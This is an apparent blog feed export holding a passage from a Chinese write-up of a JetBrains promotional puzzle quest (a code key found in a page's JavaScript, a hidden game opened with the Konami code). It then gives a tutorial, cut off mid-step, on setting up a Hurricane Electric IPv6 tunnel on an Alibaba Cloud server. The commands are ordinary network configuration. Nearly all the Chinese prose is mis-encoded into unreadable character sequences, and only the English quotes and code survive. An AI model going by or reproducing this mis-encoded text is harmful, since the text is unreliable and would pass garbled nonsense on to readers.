need</code>ã€‚</p><p>åº”è¯¥æ˜¯ä¸ä¸€ä¸ªæ¸¸æˆå¼€å‘æœ‰å…³ï¼ŒæŸ¥äº†ä¸€ä¸‹ Konami games.</p><blockquote><p>æ—¥æœ¬æœ€å…·å½±å“åŠ›çš„æ¸¸æˆè½¯ä»¶å•†ä¹‹ä¸€ï¼Œ<em>KONAMI</em>ï¼ˆç§‘ä¹ç¾ï¼‰ã€‚</p></blockquote><p>å¯èƒ½æ˜¯æœ‰ä¸ªæ¸¸æˆå•¥çš„ï¼Ÿ</p><br><h3 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h3><p>æ‰¾äº†æ‰¾ game developï¼Œå‘ç°äº†ä¸€ä¸ª<a href="https://www.jetbrains.com/gamedev/">è¿™ä¸ªç½‘é¡µ</a>ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_development.png" alt="game_development"></p><p>ç„¶åæ‰¾æ­»æ‰¾ä¸åˆ°<code>quest</code>ï¼Œéš¾å—æ­»äº†ã€‚</p><p>åœ¨ Network é‡Œæ‰¾ä¸ªåŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°å˜¤å˜¤å˜¤ã€‚</p><p>å°±åœ¨ä¸€è„¸æ‡µé€¼çš„æ—¶å€™ï¼Œæƒ³èµ·æ¥å¥½åƒæ²¡æœ‰ç”¨ Chrome çš„æ— ç—•æ¨¡å¼ï¼ˆï¼ˆ</p><blockquote><p>åæ¥å‘ç°æ˜¯æˆ‘çš„æµè§ˆå™¨å¼€äº†å¼¹çª—æ‹¦æˆªï¼ŒæŠŠæ‰¾ä¸ªä¹Ÿç»™è¯¯æ‹¦æˆªäº†emmmã€‚</p></blockquote><p>å†ä¸€æœï¼Œå‘ç°äº†ç›¸å…³çš„ js æ–‡ä»¶ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-7.png" alt="Step7"></p><br><h3 id="Beat-The-Quest-1"><a href="#Beat-The-Quest-1" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>åœ¨<code>block-breaker.js</code> è¿™ä¸ªæ–‡ä»¶é‡Œæœç´¢<code>quest</code>ï¼Œå‘ç°äº†ç¬¬äºŒä¸ª quest çš„ code â†“ã€‚</p><p><em>ï¼ˆå¯èƒ½è¿™ä¸ªä¹Ÿæ˜¯éé¢„æœŸè§£äº†23333</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/block-breakerJS.png" alt="block-breaker_JS"></p><pre class="language-none"><code class="language-none">"\n        |\n        |\n        |   Congratulations you have beat the second quest.\n        |   Use the code key GamesAreFun on the\n        |   quest page https://jb.gg/quest to claim your prize.\n        |     \n    "</code></pre><p>æ‰€ä»¥ Code å°±æ˜¯ <code>GamesAreFun</code> å•¦~</p><p>æ‹¿ç€å®ƒå» <a href="https://jb.gg/quest">https://jb.gg/quest</a> æ¢æ–°çš„æˆæƒå§å˜»å˜»å˜»ã€‚</p><p>å‘ç°ä¹Ÿæ˜¯è·³è½¬åˆ°ä¹‹å‰çš„é‚£ä¸ªé¡µé¢ï¼ˆ <a href="https://www.jetbrains.com/promo/quest/">https://www.jetbrains.com/promo/quest/</a> ï¼‰ã€‚</p><p>åŒæ ·è¾“å…¥é‚®ç®±å’Œ Code å°±å¥½äº†ã€‚</p><p>åˆå¾—åˆ°3ä¸ªæœˆçš„å…è´¹æˆæƒï¼ä¸Šé¢è¯´äº†å¯ä»¥å åŠ ä½¿ç”¨ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Beat_quest2.png" alt="Beat_quest2"></p><blockquote><p>You have passed the second quest and have proven yourself a worthy contender for our devious puzzles. We have one last quest in this series for you. It will be the ultimate quest, and it will secure your place in the halls of JetBrains Quest legend.</p><p><strong>A little @jetbrains bird will deliver the next clue â€“ so do some birdwatching,</strong></p></blockquote><p>å™«ï¼è¿˜æœ‰<strong>ä¸€ä¸ªç»ˆæçš„ quest</strong> ç­‰ç€å¤§å®¶å‘¢ï¼</p><p>çŒœä¸€çŒœæ˜¯ä¸æ˜¯å…­ä¸ªæœˆçš„æˆæƒï¼Œç„¶åå‡‘æˆä¸€æ•´å¹´å‘¢å“ˆå“ˆå“ˆå“ˆå“ˆã€‚</p><hr><p>ç„¶ååœ¨é‚®ä»¶ç»“å°¾åˆå‘ç°äº† Leetï¼Œå°±æ˜¯ Step5 ä¸­æåˆ°çš„é‚£ä¸ªé»‘å®¢è¯­ã€‚è¿™æ‰å‘ç°åŸæ¥ Quest1 çš„é‚®ä»¶ä¸­ä¹Ÿæœ‰ã€‚</p><p>å¯èƒ½è¿™ä¹Ÿç®—æ˜¯ä¸€ä¸ªæš—ç¤º/hint å§ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/email_leet.png" alt="email_leet"></p><pre class="language-none"><code class="language-none">Y0U H4V3 R3C13V3D 7H15 3M41L B3C4U53 Y0U H4V3 P4RT1C1P4T3D 1N J3TBR41N5 QU35T</code></pre><p>è¿™é‡Œè¿˜å¯ä»¥å–æ¶ˆé‚®ä»¶è®¢é˜…å•¥çš„ï¼Œåº”è¯¥è¿˜ç®—æŒºå‹å¥½çš„å§ã€‚</p><br><br><h3 id="Step7-ä¸­-game-dev-é¡µé¢çš„æ¸¸æˆè§£æ³•"><a href="#Step7-ä¸­-game-dev-é¡µé¢çš„æ¸¸æˆè§£æ³•" class="headerlink" title="Step7 ä¸­ game dev é¡µé¢çš„æ¸¸æˆè§£æ³•"></a>Step7 ä¸­ game dev é¡µé¢çš„æ¸¸æˆè§£æ³•</h3><p>å†å›å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ¸¸æˆåˆ°åº•å•¥å›äº‹ã€‚ç»“åˆå†ä¸Šä¸€æ­¥ä¸­çš„æç¤ºã€‚</p><blockquote><p><strong>To progress with your quest what youâ€™ll need:</strong></p><ul><li>To check out what we have for game developers.</li><li>Be geeky enough to remember how you used to cheat at Konami games.</li><li>Try cheating on the page.</li></ul></blockquote><p>çœ‹äº†ä¸€ä¸‹åˆ«äººçš„è®¨è®ºï¼Œæ‰å¤§æ¦‚æ˜ç™½è¿™ä¸ªçš„æ„æ€ã€‚</p><p>ä»–æ˜¯æƒ³è®©ä½ ç”¨åœ¨ Konami games é‡Œç§¯ç´¯çš„æŠ€å·§æ¥å”¤å‡ºæ¸¸æˆç•Œé¢ï¼Œç„¶åå°è¯•å®Œæˆæ¸¸æˆï¼Œæˆ–è€…å°è¯•åœ¨ç½‘é¡µä¸­ä½œå¼Šå®Œæˆï¼ˆå¯èƒ½æ˜¯ä¸Šé¢çš„éé¢„æœŸè§£å§ï¼‰ã€‚</p><p>æ ¹æ®åˆ«äººçš„è¯´æ³•ï¼Œ<strong>åœ¨ç½‘é¡µé‡Œ</strong>é€šè¿‡ä¾æ¬¡æŒ‰ä¸‹é”®ç›˜ä¸Šçš„ <code>ä¸Šä¸Šä¸‹ä¸‹å·¦å³å·¦å³BA</code> è¿™å‡ ä¸ªé”®ï¼Œå°±èƒ½å”¤å‡ºæ¸¸æˆç•Œé¢äº†ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_start.png" alt="æ¸¸æˆå¼€å§‹ç•Œé¢"></p><p>åŸæ¥å°±æ˜¯ä¸ªå¼¹çƒæ¸¸æˆå•Š 23333. è€Œä¸”çƒæ‰äº†è¿˜å¯ä»¥ç»§ç»­ç©ã€‚</p><p>çœ‹äº†ä¸€ä¸‹æ˜¯é€šè¿‡ä¸€ä¸ª canvas æ¥å®ç°çš„ã€‚</p><p>æŠŠæ¡å—æ¶ˆé™¤å¾—å·®ä¸å¤šå°±çœ‹åˆ° code key å•¦ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game.png" alt="game"></p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ„Ÿè§‰ JetBrains çš„è¿™ä¸¤ä¸ª Quest éš¾åº¦è¿˜å¥½ï¼Œè¿˜æ˜¯æŒºå‹å¥½çš„ã€‚</p><p>äºæ˜¯å°±ç™½å«–äº†æ€»å…±å…­ä¸ªæœˆçš„ JB å…¨å®¶äº§å“å…è´¹æˆæƒã€‚</p><p>ï¼ˆä¸è¿‡ä¹‹å‰å°±æœ‰æ•™è‚²é‚®ç®±çš„å…è´¹æˆæƒå‘¢</p><p>æ‰€ä»¥é€šè¿‡è¿™ä¸ª Questï¼Œè®©æˆ‘ä»¬æ›´æ·±å…¥åœ°äº†è§£äº† JBï¼Ÿè¯´ä¸å®šè¿˜èƒ½é¡ºä¾¿æ‹›è˜ï¼Ÿ</p><p>ï¼ˆè¿™å¤§æ¦‚æ˜¯å…¶æœ¬æ„å§ï¼Ÿï¼ˆç›²çŒœ</p><p>æ³¨æ„ä¸€ä¸‹ä¸Šé¢çš„å†…å®¹<strong>ä»…ä¾›å­¦ä¹ ç ”ç©¶</strong>ï¼Œè½¬è½½çš„è¯è®°å¾—ç•™ä¸‹æœ¬æ–‡é“¾æ¥å‘¢ã€‚</p><p>æ¬¢è¿ä¸€èµ·äº¤æµå˜»å˜»å˜»ã€‚</p><p>ï¼ˆæºœäº†æºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨TunnelBrokerç»™é˜¿é‡Œäº‘ECSé…ç½®å…¬ç½‘IPv6</title>
      <link href="2020/03/03/Server_ObtainIPv6ViaTunnelBroker/"/>
      <url>2020/03/03/Server_ObtainIPv6ViaTunnelBroker/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ç›®å‰ IPv6 ç”¨å¾—æŒºå¹¿äº†å§ï¼Œå¾ˆå¤šåº”ç”¨éƒ½æ”¯æŒ IPv6 äº†ï¼Œä¸‰å¤§è¿è¥å•†åŸºæœ¬éƒ½æ”¯æŒäº†ï¼Œè”é€šçš„æµé‡è‡ªå¸¦ IPv6ï¼Œè€Œä¸”å¼€çƒ­ç‚¹çš„è¯è¿˜æ”¯æŒä¸‹å‘ç»™å…¶ä»–è®¾å¤‡ã€‚</p><p>ä¸è¿‡å…¶å®å¾ˆå¤šæœåŠ¡å™¨éƒ½æ²¡ä¸Š IPv6ï¼Œæ¯”å¦‚é˜¿é‡Œäº‘çš„ ECS ä¸€èˆ¬å…¬ç½‘åªæœ‰ IPv4 åœ°å€ï¼ˆæƒ³æ‹¥æœ‰ä¸€ä¸ª IPv6 åœ°å€è¿˜å¾—å†èŠ±é’±ï¼‰ã€‚</p><p>äºæ˜¯æœ€è¿‘å°±æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œåˆ©ç”¨ Hurricane Electric æä¾›çš„<strong>å…è´¹ IPv6 Tunnel Broker</strong>ï¼Œè®©é˜¿é‡Œäº‘çš„ ECS æ‹¥æœ‰äº† IPv6 åœ°å€ï¼ˆéåŸç”Ÿï¼‰ï¼Œç†è®ºä¸Šå¤§éƒ¨åˆ†æœåŠ¡å™¨éƒ½é€‚ç”¨çš„ã€‚</p><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯ IPv6 Tunnelï¼ŒåŸºäº <strong>protocol-41 (6in4)**ï¼Œå…¶å®æ˜¯æŠŠ IPv6 åŒ…é€šè¿‡ IPv4 åŒ…æ¥ä¼ è¾“ï¼Œç›¸å½“äºå»ºç«‹åœ¨ç½‘ç»œå±‚ä¸Šçš„ä»£ç†ï¼Œéœ€è¦ä½ çš„æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè€Œä¸”è¦æœ‰ä¸€ä¸ª</strong>ç›¸å¯¹å›ºå®šçš„å…¬ç½‘ IPv4 åœ°å€**ã€‚</p><blockquote><p>When using 6to4, you do not transmit IPv6 packets. Instead, special IPv4 packets are wrapped around IPv6 payloads. These packets have IPv4  protocol 41, as defined by RFC 2473.</p></blockquote><p>å½“ç„¶ï¼Œæ€§èƒ½çš„è¯è‚¯å®šæ¯”ä¸ä¸ŠåŸç”Ÿçš„ IPv6 äº†ï¼Œä¸è¿‡è‡ªå·±ç©ç©è¿˜å¥½ï¼Œé—®é¢˜ä¸å¤§å§ã€‚</p><hr><h2 id="0x01-ç”³è¯·-IPv6-Tunnel-Broker"><a href="#0x01-ç”³è¯·-IPv6-Tunnel-Broker" class="headerlink" title="0x01 ç”³è¯· IPv6 Tunnel Broker"></a>0x01 ç”³è¯· IPv6 Tunnel Broker</h2><p>å‰å¾€ <a href="https://tunnelbroker.net/">https://tunnelbroker.net</a>ï¼Œæ³¨å†Œä¸€ä¸ªä½ è‡ªå·±çš„è´¦å·ã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/register.png" alt="æ³¨å†Œè´¦å·"></p><p>ç™»å½•ä¹‹åï¼Œç‚¹å‡»å·¦ä¾§çš„ <a href="https://www.tunnelbroker.net/new_tunnel.php">Create Regular Tunnel</a>ã€‚</p><p>ä¸€ä¸ªè´¦å·æœ€å¤šå¯ä»¥åˆ›å»º5æ¡tunnelã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/create_tunnel.png" alt="åˆ›å»ºéš§é“"></p><p>IPv4 Endpoint é‡Œå¡«<strong>æœåŠ¡å™¨çš„å…¬ç½‘åœ°å€</strong>ï¼Œè¾“å…¥åä¼šè‡ªåŠ¨æ£€æŸ¥æ˜¯å¦æ”¯æŒã€‚</p><p>You are viewing from æ˜¾ç¤ºçš„æ˜¯ä½ è®¿é—®ç½‘ç«™çš„å…¬ç½‘ IPv4 åœ°å€ï¼Œå¦‚æœæ˜¯åœ¨æœåŠ¡å™¨ä¸Šè®¿é—®çš„è¯ Endpoint å°±æ˜¯è¿™ä¸ªäº†ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>æœåŠ¡å™¨è¦<strong>å…è®¸æ¥è‡ª HE çš„ ICMP è¯·æ±‚</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç¦æ­¢æ¥è‡ª HE çš„ pingã€‚</p><p>ï¼ˆè¿™é‡Œå€Ÿä¸€å¼ ç½‘ä¸Šçš„å›¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·çš„â†“</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ICMP_blocked.png" alt="icmp_block"></p><p>Available Tunnel Servers é‡Œé€‰æ‹©ç¦»ä½ æœåŠ¡å™¨è¾ƒè¿‘çš„ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Špingè¯•ä¸€è¯•ã€‚</p><p>ç°åœ¨æ˜¾ç¤º <code>Los Angeles, CA, US Not Available (Full)</code>ï¼Œæ´›æ‰çŸ¶çš„éƒ½æ»¡äº†233.</p><p>Asia æœ‰ HKã€SGã€JP è¿™ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œä¸è¿‡æ®ç½‘ä¸Šè¯´è²Œä¼¼é€Ÿåº¦ä¹Ÿä¸æ€ä¹ˆæ ·äº†ï¼Œå…·ä½“è‡ªå·±çœ‹çœ‹å§ã€‚</p><p>é€‰æ‹©å¥½ä¹‹åå°±ç‚¹å‡»<strong>åˆ›å»ºéš§é“</strong>å°±ç”³è¯·å¥½äº†ã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/tunnel_details.png" alt="tunnel_details"></p><p>è¿™é‡Œçš„ Client IPv4 Address æ˜¯ä½ ä¹‹å‰å¡«çš„åœ°å€ï¼Œç‚¹å‡»å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œ</p><p><strong>Client IPv6 Address</strong> å°±æ˜¯ä½ æœåŠ¡å™¨çš„<strong>å…¬ç½‘IPv6åœ°å€</strong>äº†ï¼Œå¦‚æœéœ€è¦DNSè§£æçš„è¯å°±ç»™è¿™ä¸ªåœ°å€åŠ ä¸ª AAAA è§£æå°±è¡Œï¼ˆæ³¨æ„ä¸éœ€è¦åŠ ä¸Š<code>/64</code>ï¼‰ã€‚</p><p>è¿™é‡Œçš„ Routed IPv6 Prefixes æ˜¯è¯¥éš§é“å¯ç”¨äºåˆ†é…çš„ IPv6 åœ°å€æ®µï¼Œå¯ä¸ºå†…ç½‘æœºå™¨éƒ½åˆ†é…ä¸Šå”¯ä¸€çš„ IPv6 åœ°å€ã€‚</p><p>å¯è§åˆ†é…çš„æ˜¯ <code>/64</code>ï¼Œå³ IPv6 åœ°å€çš„å‰ç¼€é•¿åº¦ä¸º64ä½ã€‚åï¼ˆ128-64=ï¼‰64ä½ä¸ºç½‘ç»œæ¥å£IDï¼ˆå¯ç†è§£ä¸ºè®¾å¤‡åœ¨ç½‘ç»œä¸Šçš„å”¯ä¸€IDï¼‰ï¼Œå› æ­¤ä½ æœ‰2^64ï¼ˆ1844äº¿äº¿ï¼‰ä¸ªå¯ç”¨çš„IPåœ°å€äº†ã€‚ğŸ˜‰</p><p>å½“ç„¶ä½ è¿˜å¯ä»¥ç”³è¯·ä¸€ä¸ª<code>/48</code>å‰ç¼€çš„è·¯ç”±ï¼Œè¿™æ ·å¯ç”¨çš„åœ°å€æ›´å¤šäº†ã€‚ï¼ˆ2^80ä¸ªï¼‰</p><hr><h2 id="0x02-é˜¿é‡Œäº‘-ECS-å¼€å¯-IPv6"><a href="#0x02-é˜¿é‡Œäº‘-ECS-å¼€å¯-IPv6" class="headerlink" title="0x02 é˜¿é‡Œäº‘ ECS å¼€å¯ IPv6"></a>0x02 é˜¿é‡Œäº‘ ECS å¼€å¯ IPv6</h2><p>é˜¿é‡Œäº‘çš„ç¡¬ç›˜é•œåƒé»˜è®¤æ˜¯æŠŠ IPv6 ç»™å…³æ‰çš„ï¼Œè¿™é‡Œå°±æ‰‹åŠ¨æ‰“å¼€å¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sysctl.conf</code></pre><p>åœ¨æ–‡ä»¶æœ«å°¾çš„ä½ç½®æŠŠipv6è®¾ç½®ä¸­çš„1æ”¹æˆ0ï¼Œå˜æˆç±»ä¼¼å¦‚ä¸‹çš„äºšå­ã€‚</p><pre class="language-none"><code class="language-none">net.ipv6.conf.all.disable_ipv6 = 0net.ipv6.conf.default.disable_ipv6 = 0net.ipv6.conf.lo.disable_ipv6 = 0net.ipv6.conf.eth0.disable_ipv6 = 0</code></pre><p>è€Œåé‡æ–°è½½å…¥é…ç½®ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">sysctl -p</code></pre><p>ç„¶åä½¿ç”¨<code>ifconfig</code>çœ‹ä¸€çœ‹ï¼Œå°±ä¼šå‘ç°æ”¯æŒ IPv6 äº†ã€‚</p><p>æ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼Œæœ‰äº†<code>inet6</code>è¿™ä¸€é¡¹ã€‚</p><pre class="language-none"><code class="language-none">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.xxx.xxx.xxx  netmask 255.255.240.0  broadcast 172.xxx.xxx.xxx        inet6 fe80::xxxx:xxxx:xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:xx:xx:xx:xx  txqueuelen 1000  (ä»¥å¤ªç½‘)        RX packets 1688753  bytes 328028654 (328.0 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1837158  bytes 637871915 (637.8 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><hr><h2 id="0x03-ç»™-ECS-é…ç½®-IPv6-éš§é“"><a href="#0x03-ç»™-ECS-é…ç½®-IPv6-éš§é“" class="headerlink" title="0x03 ç»™ ECS é…ç½® IPv6 éš§é“"></a>0x03 ç»™ ECS é…ç½® IPv6 éš§é“</h2><p>åœ¨Example Configuration é‡Œæœ‰å¾ˆå¤šç¤ºä¾‹ã€‚</p><p>æ¯”å¦‚Ubuntuçš„ã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration.png" alt="interface_configuration"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/network/interfaces</code></pre><pre class="language-none"><code class="language-none">auto he-ipv6iface he-ipv6 inet6 v4tunnel        address 2001:470:xxxx:xxxx::2        netmask 64        endpoint 216.218.xxx.xxx        local 172.16.xxx.xxx        ttl 255        gateway 2001:470:xxxx:xxxx::1</code></pre><p>å°†ä¸Šé¢çš„é…ç½®ç²˜è´´åˆ°æ–‡ä»¶çš„æœ€åã€‚</p><p>æ³¨æ„ä¸€ä¸‹ï¼Œ<strong>å†…ç½‘ç¯å¢ƒè¦ç”¨å†…ç½‘çš„IPï¼</strong>ä»–è¿™é‡Œä¹Ÿå†™æ¸…æ¥šäº†çš„ã€‚</p><blockquote><p><strong>NOTE:</strong> When behind a firewall appliance that passes protocol 41,  use the IPv4 address you get from your applianceâ€™s DHCP service instead  of the IPv4 endpoint you provided to our broker.</p></blockquote><p><strong>æ³¨æ„ï¼š</strong> é˜¿é‡Œäº‘çš„ ECS è¦<strong>å°†localä¸­çš„IPä¿®æ”¹ä¸ºå†…ç½‘çš„IP</strong>ï¼Œå³ç§ç½‘IPåœ°å€ï¼Œä¾‹å¦‚<code>172.16.xxx.xxx</code>ï¼Œè€Œä¸æ˜¯å…¬ç½‘IPï¼ï¼ï¼</p><p>ä¸æ¸…æ¥šçš„è¯è¿˜å¯ä»¥å‚è€ƒ<strong>Ubuntuçš„Wiki</strong>ï¼Œ<a href="https://wiki.ubuntu.com/IPv6#Get_connected_with_Hurricane_Electric">æˆ³è¿™é‡Œ</a>ã€‚</p><p>è€Œå<strong>è®©IPv6ç”Ÿæ•ˆ</strong>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifup</span> he-ipv6</code></pre><p>å†çœ‹ä¸€ä¸‹ <code>ifconfig</code>ï¼Œè¿™æ—¶åº”è¯¥æœ‰ä¸€ä¸ª <code>he-ipv6</code>çš„äº†ï¼ç±»ä¼¼è¿™æ ·çš„ã€‚</p><pre class="language-none"><code class="language-none">he-ipv6: flags=209&lt;UP,POINTOPOINT,RUNNING,NOARP&gt;  mtu 1480          inet6 2001:470:xxxx:xxxx::2  prefixlen 64  scopeid 0x0&lt;global&gt;          inet6 fe80::xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;          sit  txqueuelen 1000  (IPv6-in-IPv4)          RX packets 11605  bytes 3127821 (3.1 MB)          RX errors 0  dropped 0  overruns 0  frame 0          TX packets 13811  bytes 2403522 (2.4 MB)          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p><em>P.S.:</em></p><p>å¦‚æœæƒ³<strong>è®©éš§é“å¤±æ•ˆ</strong>ï¼ˆæ²¡æœ‰åˆ é™¤çš„è¯é‡å¯åè¿˜æ˜¯ä¼šè‡ªåŠ¨å¯ç”¨ï¼‰ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifdown</span> he-ipv6</code></pre><p>å¦‚æœæƒ³<strong>åˆ é™¤éš§é“</strong>ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> tunnel del he-ipv6</code></pre><p>å¦‚æœå·²ç»ç”Ÿæ•ˆäº†ä¼šæç¤ºï¼š<code>ifup: interface he-ipv6 already configured</code>ã€‚</p><p>å¦‚æœè®¾ç½®å‡ºé”™äº†ï¼Œæˆ–è€…æƒ³ä¿®æ”¹é…ç½®ï¼Œéœ€è¦å…ˆåˆ é™¤éš§é“ï¼Œå†é‡æ–°ç”Ÿæ•ˆå°±å¥½ã€‚</p><p>ç°åœ¨å°±æ¥<strong>æµ‹è¯•ä¸€ä¸‹</strong>å§ï¼</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@miaoTony:~<span class="token comment"># ping6 -c 5 ipv6.google.com</span>PING ipv6.google.com<span class="token punctuation">(</span>tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">))</span> <span class="token number">56</span> data bytes<span class="token number">64</span> bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">53</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">393</span> ms<span class="token number">64</span> bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">53</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">390</span> ms<span class="token number">64</span> bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">53</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">390</span> ms<span class="token number">64</span> bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">53</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">393</span> ms<span class="token number">64</span> bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span><span class="token number">2404</span>:6800:4008:803::200e<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">53</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">388</span> ms--- ipv6.google.com <span class="token function">ping</span> statistics ---<span class="token number">5</span> packets transmitted, <span class="token number">5</span> received, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 4003msrtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">388.107</span>/391.132/393.213/1.914 ms</code></pre><p>å½“ç„¶ä¹Ÿå¯ä»¥ <code>ping6 ipv6.baidu.com</code>ã€‚</p><p>å¦‚æœä¸æˆåŠŸå¯ä»¥é‡å¯ç³»ç»Ÿè¯•è¯•ã€‚</p><hr><p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å°è¯•åœ¨å‘½ä»¤è¡Œä¸­è¿›è¡Œé…ç½®ï¼ˆç•¥ï¼‰ã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration2.png" alt="interface_configuration2"></p><p>Windows 10 ä¸‹çš„é…ç½®ï¼Œåœ¨ cmd ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚</p><pre class="language-none"><code class="language-none">netsh interface teredo set state disablednetsh interface ipv6 add v6v4tunnel interface=IP6Tunnel localaddress=172.16.xxx.xxx remoteaddress=216.218.xxx.xxxnetsh interface ipv6 add address interface=IP6Tunnel address=2001:470:xx:xxxx::2netsh interface ipv6 add route prefix=::/0 interface=IP6Tunnel nexthop=2001:470:xx:xxxx::1</code></pre><p>æ³¨æ„ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ã€‚</p><hr><h2 id="0x04-ä¸€äº›é—®é¢˜çš„è§£å†³"><a href="#0x04-ä¸€äº›é—®é¢˜çš„è§£å†³" class="headerlink" title="0x04 ä¸€äº›é—®é¢˜çš„è§£å†³"></a>0x04 ä¸€äº›é—®é¢˜çš„è§£å†³</h2><p><strong>æŒ‰ç…§ä¸Šé¢ä¸€ç•ªé…ç½®å¥½</strong>ä¹‹åï¼Œæœ‰å¯èƒ½è¿˜æ˜¯è®¿é—®ä¸äº† IPv6 çš„ç½‘ç«™ã€‚</p><p><strong>æœ‰å¯èƒ½</strong>éœ€è¦å¦‚ä¸‹å¤„ç†å§ã€‚<em>ï¼ˆè°çŸ¥é“ä¼šè¿™ä¹ˆéº»çƒ¦å‘¢</em></p><p>è¦æ˜¯æ²¡äº‹äº†å°±ç›´æ¥å¾€ä¸‹çœ‹äº†ã€‚</p><ul><li>éœ€è¦æ”¾è¡ŒæœåŠ¡å™¨çš„41ç«¯å£ã€‚æ¯•ç«Ÿæµé‡æ˜¯é€šè¿‡IPv4ä¼ è¾“çš„å•¦ã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">ufw allow <span class="token number">41</span></code></pre><p>æˆ–è€…</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables -t filter -I INPUT -p <span class="token number">41</span> -j ACCEPTiptables -t filter -I OUTPUT -p <span class="token number">41</span> -j ACCEPT</code></pre><p>åŒæ—¶è¦è®°å¾—åœ¨ï¼ˆé˜¿é‡Œäº‘çš„ï¼‰<strong>å®‰å…¨ç»„é‡Œæ”¾è¡Œ</strong>ã€‚</p><ul><li>é…ç½®å¥½ IPv6 çš„ DNS</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/resolv.conf</code></pre><p>åœ¨æœ€åæ·»åŠ 